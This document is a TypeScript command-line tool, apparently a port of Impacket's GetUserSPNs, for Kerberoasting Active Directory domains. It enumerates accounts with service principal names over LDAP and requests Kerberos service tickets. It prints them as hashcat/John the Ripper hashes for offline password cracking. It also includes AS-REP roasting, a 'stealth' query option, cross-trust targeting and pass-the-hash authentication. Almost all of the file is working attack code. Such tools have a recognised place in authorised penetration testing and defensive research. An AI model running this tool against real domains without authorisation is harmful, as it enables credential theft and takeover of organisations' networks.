#!/usr/bin/env node
/**
 * Impacket-js - GetUserSPNs
 *
 * Queries target domain for SPNs that are associated with normal user accounts.
 * Since normal account passwords tend to be shorter than machine accounts, and
 * knowing that a TGS request will encrypt the ticket with the account the SPN
 * is running under, this can be used for an offline bruteforcing attack of the
 * SPN account NTLM hash (Kerberoasting).
 *
 * Original research by Tim Medin (@timmedin).
 * Python implementation by Alberto Solino (@agsolino).
 * TypeScript port.
 */

import { Buffer } from 'node:buffer';
import { readFileSync, writeFileSync } from 'node:fs';
import { parseArgs } from 'node:util';

import {
  parseIdentity,
  init as initLogger,
  info,
  error as logError,
  warning,
  debug as logDebug,
  getLevel,
  LogLevel,
  normalizeArgs,
  initProxy,
  BANNER,
} from '@impacket/examples';

import {
  KerberosV5,
  Types,
  Constants,
  Asn1,
  CCache as KrbCCache,
  Crypto,
} from '@impacket/krb5';

import {
  LDAPConnection,
  LDAPSearchError,
  type SearchResultEntry,
  type LdapControl,
  createSimplePagedResultsControl,
} from '@impacket/ldap';

import { computeLmhash, computeNthash } from '@impacket/ntlm';

// ---------- UserAccountControl flags ----------
const UF_ACCOUNTDISABLE = 0x0002;
const UF_TRUSTED_FOR_DELEGATION = 0x80000;
const UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x1000000;

// ---------- helpers ----------

function getUnixTime(t: number): number {
  return (t - 116444736000000000) / 10000000;
}

function printTable(items: string[][], header: string[]): void {
  const colLen = header.map((col, i) => {
    const maxRow = items.reduce((mx, row) => Math.max(mx, (row[i] ?? '').length), 0);
    return Math.max(maxRow, col.length);
  });

  const formatRow = (row: string[]): string =>
    row.map((cell, i) => cell.padEnd(colLen[i]!)).join('  ');

  console.log(formatRow(header));
  console.log(colLen.map((l) => '-'.repeat(l)).join('  '));
  for (const row of items) {
    console.log(formatRow(row));
  }
}

// ---------- main class ----------

interface GetUserSPNsOptions {
  targetDomain: string;
  noPreauth: string | null;
  outputFile: string | null;
  noRC4: boolean;
  usersFile: string | null;
  aesKey: string;
  doKerberos: boolean;
  request: boolean;
  dcIp: string | null;
  dcHost: string | null;
  save: boolean;
  requestUser: string | null;
  stealth: boolean;
  machineOnly: boolean;
  requestMachine: string | null;
  debug: boolean;
  ts: boolean;
}

class GetUserSPNs {
  private username: string;
  private password: string;
  private domain: string;
  private targetDomain: string;
  private lmhash = '';
  private nthash = '';
  private noPreauth: string | null;
  private outputFile: string | null;
  private noRC4: boolean;
  private usersFile: string | null;
  private aesKey: string;
  private doKerberos: boolean;
  private requestTGS: boolean;
  private kdcIp: string | null;
  private kdcHost: string | null;
  private saveTGS: boolean;
  private requestUser: string | null;
  private stealth: boolean;
  private machineOnly: boolean;
  private requestMachine: string | null;
  private baseDN: string;

  constructor(
    username: string,
    password: string,
    userDomain: string,
    targetDomain: string,
    lmhash: string,
    nthash: string,
    opts: GetUserSPNsOptions,
  ) {
    this.username = username;
    this.password = password;
    this.domain = userDomain;
    this.targetDomain = targetDomain;
    this.lmhash = lmhash;
    this.nthash = nthash;
    this.noPreauth = opts.noPreauth;
    this.outputFile = opts.outputFile;
    this.noRC4 = opts.noRC4;
    this.usersFile = opts.usersFile;
    this.aesKey = opts.aesKey;
    this.doKerberos = opts.doKerberos;
    this.requestTGS = opts.request;
    this.kdcIp = opts.dcIp;
    this.kdcHost = opts.dcHost;
    this.saveTGS = opts.save;
    this.requestUser = opts.requestUser;
    this.stealth = opts.stealth;
    this.machineOnly = opts.machineOnly;
    this.requestMachine = opts.requestMachine;

    // Build baseDN from targetDomain
    this.baseDN = targetDomain
      .split('.')
      .map((p) => `dc=${p}`)
      .join(',');

    // Cross-domain targeting: KDC IP/hostname must not be used
    if (userDomain !== targetDomain && (this.kdcIp || this.kdcHost)) {
      warning('KDC IP address and hostname will be ignored because of cross-domain targeting.');
      this.kdcIp = null;
      this.kdcHost = null;
    }
  }

  private async getTGT(): Promise<KerberosV5.TGTResult> {
    const userName = new Types.Principal(
      this.username,
      null,
      Constants.PrincipalNameType.NT_PRINCIPAL,
    );

    if (this.password !== '' && this.lmhash === '' && this.nthash === '' && !this.noRC4) {
      try {
        return await KerberosV5.getKerberosTGT(
          userName,
          '',
          this.domain,
          computeLmhash(this.password),
          computeNthash(this.password),
          this.aesKey,
          this.kdcIp,
        );
      } catch {
        logDebug('TGT with NTLM hashes failed, trying cleartext password');
      }
    }

    return KerberosV5.getKerberosTGT(
      userName,
      this.password,
      this.domain,
      this.lmhash,
      this.nthash,
      this.aesKey,
      this.kdcIp,
    );
  }

  private outputTGS(
    ticket: Buffer,
    _oldSessionKey: Crypto.Key,
    _sessionKey: Crypto.Key,
    username: string,
    spn: string,
    fd: string[] | null,
  ): void {
    // Decode the TGS-REP (or AS-REP if no-preauth)
    let decodedTGS: Record<string, unknown>;
    if (this.noPreauth) {
      const asRep = Asn1.AS_REP();
      asRep.decode(ticket);
      decodedTGS = asRep.values;
    } else {
      const tgsRep = Asn1.TGS_REP();
      tgsRep.decode(ticket);
      decodedTGS = tgsRep.values;
    }

    const ticketPart = decodedTGS['ticket'] as Record<string, unknown>;
    const encPart = ticketPart['enc-part'] as Record<string, unknown>;
    const realm = ticketPart['realm'] as string;
    const etype = Number(encPart['etype']);
    const cipherBuf = encPart['cipher'] as Buffer;

    let entry: string;
    const spnSafe = spn.replace(/:/g, '~');

    if (etype === Constants.EncryptionTypes.rc4_hmac) {
      const checksum = cipherBuf.subarray(0, 16).toString('hex');
      const data = cipherBuf.subarray(16).toString('hex');
      entry = `$krb5tgs$${etype}$*${username}$${realm}$${spnSafe}*$${checksum}$${data}`;
    } else if (
      etype === Constants.EncryptionTypes.aes128_cts_hmac_sha1_96 ||
      etype === Constants.EncryptionTypes.aes256_cts_hmac_sha1_96
    ) {
      const checksum = cipherBuf.subarray(-12).toString('hex');
      const data = cipherBuf.subarray(0, -12).toString('hex');
      entry = `$krb5tgs$${etype}$${username}$${realm}$*${spnSafe}*$${checksum}$${data}`;
    } else if (etype === Constants.EncryptionTypes.des_cbc_md5) {
      const checksum = cipherBuf.subarray(0, 16).toString('hex');
      const data = cipherBuf.subarray(16).toString('hex');
      entry = `$krb5tgs$${etype}$*${username}$${realm}$${spnSafe}*$${checksum}$${data}`;
    } else {
      const sname = ticketPart['sname'] as Record<string, unknown>;
      const nameString = sname['name-string'] as { value: string }[];
      logError(
        `Skipping ${nameString[0]?.value ?? '?'}/${nameString[1]?.value ?? '?'} due to incompatible e-type ${etype}`,
      );
      return;
    }

    console.log(entry);
    if (fd !== null) {
      fd.push(entry);
    }

    if (this.saveTGS) {
      logDebug(`About to save TGS for ${username}`);
      try {
        const ccache = new KrbCCache.CCache();
        ccache.setDefaultHeader();
        // Save raw ticket data
        const cred = new KrbCCache.Credential();
        cred.ticket = new KrbCCache.CountedOctetString();
        cred.ticket.data = ticket;
        ccache.credentials.push(cred);
        ccache.saveFile(`${username}.ccache`);
      } catch (e) {
        logError(String(e));
      }
    }
  }

  async run(): Promise<void> {
    if (this.usersFile) {
      await this.requestUsersFileTGSs();
      return;
    }

    // Connect to LDAP
    const ldapUrl = `ldap://${this.targetDomain}`;
    const ldapConn = new LDAPConnection({
      url: ldapUrl,
      baseDN: this.baseDN,
      dstIp: this.kdcIp ?? undefined,
      ...(this.doKerberos ? { signing: false } : {}),
    });
    await ldapConn.connect();
    if (this.doKerberos) {
      await ldapConn.kerberosLogin({
        user: this.username,
        password: this.password,
        domain: this.domain,
        lmhash: this.lmhash,
        nthash: this.nthash,
        aesKey: this.aesKey,
        kdcHost: this.kdcHost,
      });
    } else {
      await ldapConn.login({
        user: this.username,
        password: this.password,
        domain: this.domain,
        lmhash: this.lmhash,
        nthash: this.nthash,
      });
    }

    // Build the search filter
    const filterSpn = 'servicePrincipalName=*';
    const filterPerson = 'objectCategory=person';
    const filterComputer = 'objectCategory=computer';
    const filterNotDisabled = '!(userAccountControl:1.2.840.113556.1.4.803:=2)';

    let searchFilter: string;
    if (this.machineOnly) {
      logDebug('-machine-only flag detected');
      searchFilter = `(&(${filterComputer})(${filterNotDisabled})`;
      if (this.requestMachine !== null) {
        logDebug(`Including machine account (${this.requestMachine}) in LDAP query filter`);
        searchFilter += `(sAMAccountName:=${this.requestMachine})`;
      }
    } else {
      searchFilter = `(&(${filterPerson})(${filterNotDisabled})`;
      if (this.requestUser !== null) {
        searchFilter += `(sAMAccountName:=${this.requestUser})`;
      }
    }

    if (this.stealth) {
      warning(
        'Stealth option may cause huge memory consumption / out-of-memory errors on very large domains.',
      );
    } else {
      searchFilter += `(${filterSpn})`;
    }

    searchFilter += ')';

    let resp: SearchResultEntry[];
    try {
      const pagedControl = createSimplePagedResultsControl(1000);
      resp = await ldapConn.search({
        searchFilter,
        attributes: [
          'servicePrincipalName',
          'sAMAccountName',
          'pwdLastSet',
          'MemberOf',
          'userAccountControl',
          'lastLogon',
        ],
        searchControls: [pagedControl],
      });
    } catch (e) {
      if (e instanceof LDAPSearchError && e.getErrorString().includes('sizeLimitExceeded')) {
        logDebug('sizeLimitExceeded exception caught, giving up and processing the data received');
        resp = e.getAnswers();
      } else {
        throw e;
      }
    }

    // Process results
    type AnswerRow = [string, string, string, string, string, string];
    const answers: AnswerRow[] = [];
    logDebug(`Total of records returned ${resp.length}`);

    for (const item of resp) {
      let mustCommit = false;
      let sAMAccountName = '';
      let memberOf = '';
      const SPNs: string[] = [];
      let pwdLastSet = '';
      let userAccountControl = 0;
      let lastLogon = 'N/A';
      let delegation = '';

      try {
        for (const attribute of item.attributes) {
          if (attribute.type === 'sAMAccountName') {
            sAMAccountName = attribute.vals[0]?.toString() ?? '';
            mustCommit = true;
          } else if (attribute.type === 'userAccountControl') {
            userAccountControl = parseInt(attribute.vals[0]?.toString() ?? '0', 10);
            if (userAccountControl & UF_TRUSTED_FOR_DELEGATION) {
              delegation = 'unconstrained';
            } else if (userAccountControl & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) {
              delegation = 'constrained';
            }
          } else if (attribute.type === 'memberOf') {
            memberOf = attribute.vals[0]?.toString() ?? '';
          } else if (attribute.type === 'pwdLastSet') {
            const val = attribute.vals[0]?.toString() ?? '0';
            if (val === '0') {
              pwdLastSet = '<never>';
            } else {
              const ts = getUnixTime(parseInt(val, 10));
              pwdLastSet = new Date(ts * 1000).toISOString().replace('T', ' ').slice(0, 19);
            }
          } else if (attribute.type === 'lastLogon') {
            const val = attribute.vals[0]?.toString() ?? '0';
            if (val === '0') {
              lastLogon = '<never>';
            } else {
              const ts = getUnixTime(parseInt(val, 10));
              lastLogon = new Date(ts * 1000).toISOString().replace('T', ' ').slice(0, 19);
            }
          } else if (attribute.type === 'servicePrincipalName') {
            for (const spn of attribute.vals) {
              SPNs.push(Buffer.isBuffer(spn) ? spn.toString('utf-8') : String(spn));
            }
          }
        }

        if (mustCommit) {
          if (userAccountControl & UF_ACCOUNTDISABLE) {
            logDebug(`Bypassing disabled account ${sAMAccountName}`);
          } else {
            for (const spn of SPNs) {
              answers.push([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation]);
            }
          }
        }
      } catch (e) {
        logError(`Skipping item, cannot process due to error ${String(e)}`);
      }
    }

    if (answers.length > 0) {
      printTable(
        answers,
        ['ServicePrincipalName', 'Name', 'MemberOf', 'PasswordLastSet', 'LastLogon', 'Delegation'],
      );
      console.log('\n');

      if (this.requestTGS || this.requestUser !== null || this.requestMachine !== null) {
        // Get unique user names and a SPN to request a TGS for
        const users = new Map<string, string>();
        for (const row of answers) {
          users.set(row[1], row[0]);
        }

        const tgt = await this.getTGT();
        const outputLines: string[] | null = this.outputFile !== null ? [] : null;

        for (const [user, SPN] of users) {
          const downLevelLogonName = `${this.targetDomain}\\${user}`;

          try {
            const principalName = new Types.Principal();
            principalName.type = Constants.PrincipalNameType.NT_MS_PRINCIPAL;
            principalName.components = [downLevelLogonName];

            const tgsResult = await KerberosV5.getKerberosTGS(
              principalName,
              this.domain,
              this.kdcIp,
              tgt.tgt,
              tgt.cipher,
              tgt.sessionKey,
            );

            this.outputTGS(
              tgsResult.tgs,
              tgsResult.oldSessionKey,
              tgsResult.sessionKey,
              user,
              `${this.targetDomain}/${user}`,
              outputLines,
            );
          } catch (e) {
            logError(`Principal: ${downLevelLogonName} - ${String(e)}`);
          }
        }

        if (this.outputFile !== null && outputLines !== null) {
          writeFileSync(this.outputFile, outputLines.join('\n') + '\n');
        }
      }
    } else {
      console.log('No entries found!');
    }

    ldapConn.close();
  }

  private async requestUsersFileTGSs(): Promise<void> {
    const content = readFileSync(this.usersFile!, 'utf-8');
    const usernames = content
      .split('\n')
      .map((l) => l.trim())
      .filter((l) => l.length > 0);
    await this.requestMultipleTGSs(usernames);
  }

  private async requestMultipleTGSs(usernames: string[]): Promise<void> {
    const outputLines: string[] | null = this.outputFile !== null ? [] : null;

    if (this.noPreauth) {
      for (const username of usernames) {
        try {
          const noPreAuthPrincipal = new Types.Principal(
            this.noPreauth,
            null,
            Constants.PrincipalNameType.NT_PRINCIPAL,
          );

          const tgt = await KerberosV5.getKerberosTGT(
            noPreAuthPrincipal,
            this.password,
            this.domain,
            this.lmhash,
            this.nthash,
            this.aesKey,
            this.kdcHost,
            true,
            username,
            true,
          );

          this.outputTGS(
            tgt.tgt,
            tgt.key,
            tgt.sessionKey,
            username,
            username,
            outputLines,
          );
        } catch (e) {
          logError(`Principal: ${username} - ${String(e)}`);
        }
      }
    } else {
      const tgt = await this.getTGT();

      for (const username of usernames) {
        try {
          const principalName = new Types.Principal();
          principalName.type = Constants.PrincipalNameType.NT_ENTERPRISE;
          principalName.components = [username];

          const tgsResult = await KerberosV5.getKerberosTGS(
            principalName,
            this.domain,
            this.kdcIp,
            tgt.tgt,
            tgt.cipher,
            tgt.sessionKey,
          );

          this.outputTGS(
            tgsResult.tgs,
            tgsResult.oldSessionKey,
            tgsResult.sessionKey,
            username,
            username,
            outputLines,
          );
        } catch (e) {
          logError(`Principal: ${username} - ${String(e)}`);
        }
      }
    }

    if (this.outputFile !== null && outputLines !== null) {
      writeFileSync(this.outputFile, outputLines.join('\n') + '\n');
    }
  }
}

// ---------- CLI ----------

function usage(): never {
  console.log(`Queries target domain for SPNs that are running under a user account

usage: GetUserSPNs [-h] [-target-domain target_domain]
                   [-no-preauth account] [-stealth] [-machine-only]
                   [-usersfile USERSFILE] [-request]
                   [-request-user username] [-request-machine machinename]
                   [-save] [-outputfile OUTPUTFILE] [-no-rc4] [-ts] [-debug]
                   [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                   [-dc-ip ip address] [-dc-host hostname]
                   target

positional arguments:
  target                domain[/username[:password]]

options:
  -h, --help            show this help message and exit
  -target-domain target_domain
                        Domain to query/request if different than the domain
                        of the user. Allows for Kerberoasting across trusts.
  -no-preauth account   Account that does not require preauth, to obtain a
                        Service Ticket through an AS
  -stealth              Removes the (servicePrincipalName=*) filter from the
                        LDAP query for added stealth. May cause memory issues
                        on large domains.
  -machine-only         Queries machine accounts only; adjusts objectCategory
                        to computer
  -usersfile USERSFILE  File with user per line to test
  -request              Requests TGS for users and output them in JtR/hashcat
                        format
  -request-user username
                        Requests TGS for the SPN associated to the user
                        specified
  -request-machine machinename
                        Requests TGS for the SPN associated to the machine
                        specified (e.g. workstation01$)
  -save                 Saves requested TGS to disk as <username>.ccache.
                        Automatically selects -request
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -no-rc4               Prevents forcing RC4-HMAC for the TGT request
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME)
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller
  -dc-host hostname     Hostname of the domain controller to use
`);
  process.exit(1);
}

async function main(): Promise<void> {
  const args = normalizeArgs(process.argv.slice(2));

  if (args.length === 0) {
    usage();
  }

  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args,
      allowPositionals: true,
      options: {
        'target-domain': { type: 'string' },
        'no-preauth': { type: 'string' },
        stealth: { type: 'boolean', default: false },
        'machine-only': { type: 'boolean', default: false },
        usersfile: { type: 'string' },
        request: { type: 'boolean', default: false },
        'request-user': { type: 'string' },
        'request-machine': { type: 'string' },
        save: { type: 'boolean', default: false },
        outputfile: { type: 'string' },
        'no-rc4': { type: 'boolean', default: false },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', default: false },
        aesKey: { type: 'string' },
        'dc-ip': { type: 'string' },
        'dc-host': { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    usage();
  }

  if (values.help || positionals.length < 1) {
    usage();
  }

  const target = positionals[0]!;

  initLogger({ ts: values.ts, debug: values.debug });
  initProxy(values.proxy);

  if (values['no-preauth'] && !values.usersfile) {
    logError(
      'You have to specify -usersfile when -no-preauth is supplied. ' +
      'Usersfile must contain a list of SPNs and/or sAMAccountNames to Kerberoast.',
    );
    process.exit(1);
  }

  const identity = parseIdentity(target, {
    hashes: values.hashes,
    noPass: values['no-pass'],
    aesKey: values.aesKey,
    k: values.k,
  });

  if (identity.domain === '') {
    logError('userDomain should be specified!');
    process.exit(1);
  }

  const targetDomain = values['target-domain'] ?? identity.domain;
  let doRequest = values.request ?? false;

  if (values.save || values.outputfile) {
    doRequest = true;
  }

  let machineOnly = values['machine-only'] ?? false;
  if (values['request-machine'] !== undefined) {
    machineOnly = true;
  }

  const opts: GetUserSPNsOptions = {
    targetDomain,
    noPreauth: values['no-preauth'] ?? null,
    outputFile: values.outputfile ?? null,
    noRC4: values['no-rc4'] ?? false,
    usersFile: values.usersfile ?? null,
    aesKey: values.aesKey ?? '',
    doKerberos: identity.doKerberos,
    request: doRequest,
    dcIp: values['dc-ip'] ?? null,
    dcHost: values['dc-host'] ?? null,
    save: values.save ?? false,
    requestUser: values['request-user'] ?? null,
    stealth: values.stealth ?? false,
    machineOnly,
    requestMachine: values['request-machine'] ?? null,
    debug: values.debug ?? false,
    ts: values.ts ?? false,
  };

  try {
    const executer = new GetUserSPNs(
      identity.username,
      identity.password,
      identity.domain,
      targetDomain,
      identity.lmhash,
      identity.nthash,
      opts,
    );
    await executer.run();
  } catch (e) {
    if (getLevel() === LogLevel.DEBUG) {
      console.error(e);
    }
    logError(String(e));
  }
}

main();
